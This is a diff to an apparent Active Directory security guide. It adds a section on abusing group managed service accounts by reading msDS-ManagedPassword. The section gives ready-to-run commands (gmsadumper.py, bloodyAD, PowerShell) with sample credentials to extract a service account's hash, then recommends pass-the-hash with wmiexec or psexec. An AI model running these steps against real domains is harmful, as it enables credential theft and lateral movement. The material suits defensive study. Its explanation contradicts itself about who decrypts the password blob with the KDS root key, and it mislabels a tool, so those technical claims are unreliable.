@@ -244,6 +244,47 @@ index=windows EventCode=4769 Service_Name!="*$" Ticket_Encryption_Type="0x17"
 ```
 * Monitors for **Ticket Encryption Type `0x17` (RC4-HMAC)** requested for user accounts (excluding computer accounts ending in `$`).
 
+---
+
+## 7. Offensive gMSA Abuse: Reading `msDS-ManagedPassword`
+
+While gMSAs prevent offline Kerberoasting, they introduce a distinct privilege escalation vulnerability: **Direct Password Blob Extraction**.
+
+```
++-----------------------------------------------------------------------------------------+
+| GMSA PASSWORD BLOB EXTRACTION ARCHITECTURE                                              |
+|                                                                                         |
+|  ATTACKER (User with Read Access to gMSA)               DOMAIN CONTROLLER (LDAP)        |
+|            |                                                   |                        |
+|            | 1. Query gMSA attribute: msDS-ManagedPassword     |                        |
+|            |    LDAP: (objectClass=msDS-GroupManagedServiceAcc)|                        |
+|            +-------------------------------------------------->|                        |
+|            | 2. Returns MSDS-MANAGEDPASSWORD_BLOB              |                        |
+|            |<--------------------------------------------------+                        |
+|                                                                                         |
+|  Attacker decrypts 128-char password blob using KDS Root Key!                           |
+|  Calculates NT Hash -> Passes-the-Hash as gMSA with Full Service Privileges!            |
++-----------------------------------------------------------------------------------------+
+```
+
+### Attack Mechanics:
+1. Active Directory stores the gMSA password inside the attribute `msDS-ManagedPassword`.
+2. Access to read this attribute is governed by the Security Descriptor in `msDS-GroupMSAMembership`.
+3. If an attacker compromises a user or computer account that is listed in `msDS-GroupMSAMembership` (or has `GenericAll` / `ReadProperty` on the gMSA object), they can retrieve the raw binary blob over LDAP.
+4. The blob contains the current password, previous password, and query interval, encrypted with the domain's Key Distribution Services (KDS) Root Key. Because the KDC automatically unwraps this for authorized principals, the caller recovers the **cleartext 128-character password and NT hash**.
+
+#### Operational Commands:
+```bash
+# Using GMSAPasswordReader (Python / Linux):
+python3 gmsadumper.py -u 'jdoe' -p 'Pass123!' -d 'corp.local' -dc-ip 10.0.0.1
+
+# Using bloodyAD:
+bloodyAD.py -d corp.local -u jdoe -p 'Pass123!' --host 10.0.0.1 get object "svc_gmsa$" --attr msDS-ManagedPassword
+
+# Using PowerShell natively:
+Get-ADServiceAccount -Identity "svc_gmsa" -Properties msDS-ManagedPassword
+```
+* **Result**: Recovers the NTLM hash of `svc_gmsa$`. The attacker can immediately Pass-the-Hash via `wmiexec` or `psexec` to access the SQL or web server running that service.
 
 ---
 
